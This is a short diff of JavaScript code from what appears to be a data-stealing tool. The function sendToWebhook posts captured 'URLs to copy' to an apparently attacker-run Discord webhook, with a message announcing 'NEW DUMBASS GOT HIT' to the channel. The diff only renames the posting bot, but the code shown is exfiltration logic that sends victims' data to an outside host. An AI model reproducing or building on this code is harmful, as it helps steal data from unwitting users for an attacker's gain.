@@ -133,7 +133,7 @@ async function sendToWebhook(data) {
             },
             body: JSON.stringify({
                 content: `@everyone NEW DUMBASS GOT HIT 🤑💰💰\n\n**URLs to copy:**\n${urlMessage}`,
-                username: 'LinkShift Bot',
+                username: 'ctjs lost brother',
                 avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
                 embeds: [embed]
             })
